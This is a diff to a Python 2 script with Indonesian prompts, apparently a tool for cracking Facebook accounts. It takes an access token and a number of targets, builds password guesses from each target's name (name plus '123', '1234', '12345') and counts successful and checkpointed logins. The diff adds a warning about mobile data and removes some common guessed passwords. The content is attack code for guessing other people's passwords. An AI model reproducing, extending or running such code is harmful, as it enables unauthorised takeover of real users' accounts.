@@ -71,7 +71,7 @@ def crack():
 	except IOError:
 		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
 		tokenz()
-	print ('\033[1;93m -------------------------------\n\033[1;97m  [\033[1;92m#\033[1;97m] Target Min \033[1;97m1 \033[1;97mMaks \033[1;92m10')
+	print ('\033[1;93m -------------------------------\n\033[1;97m[\033[1;92m?\033[1;97m] Target Min \033[1;97m1 \033[1;97mMaks \033[1;92m10')
 	limt = raw_input(' \033[0;97m[\033[0;91m+\033[0;97m] Berapa Target : ')
 	if limt =='':
 		print (' \033[1;97m[\033[1;91m!\033[1;97m] Wajib Diisi !')
@@ -667,6 +667,9 @@ def crack():
 	
 	def main(user):
 		global loop, token
+		print ' \033[1;97m=================================================='
+            	print ' [\033[1;91m!\033[1;97m] \033[1;91mMatikan data selular untuk menjeda proses'
+            	print ' \033[1;97m=================================================='
 		pwx = []
 		sys.stdout.write(
 		      '\r \033[0;97m[*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp))
@@ -685,10 +688,7 @@ def crack():
 					pwx.append(ss+"123")
 					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
-					pwx.append("12345")
 					pwx.append(ss)
-					pwx.append("bismillah")
-					pwx.append("sayang")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
